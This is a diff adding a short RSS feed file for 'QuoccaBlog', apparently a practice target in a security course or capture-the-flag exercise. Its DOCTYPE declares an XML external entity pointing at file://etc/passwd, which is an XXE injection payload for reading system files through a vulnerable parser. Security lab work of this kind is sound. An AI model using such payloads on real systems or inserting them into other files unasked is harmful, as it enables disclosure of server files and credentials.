@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE rss [ <!ENTITY example SYSTEM "file://etc/passwd"> ]>
+<rss version="2.0">
+
+<channel>
+  <title>QuoccaBlog</title>
+  <link>https://blog.quoccabank.com</link>
+  <description>The blogging home of QuoccaBank</description>
+  <item>
+    <title>RSS Tutorial</title>
+    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
+    <description>New RSS tutorial on W3Schools</description>
+  </item>
+</channel>
+
+</rss>
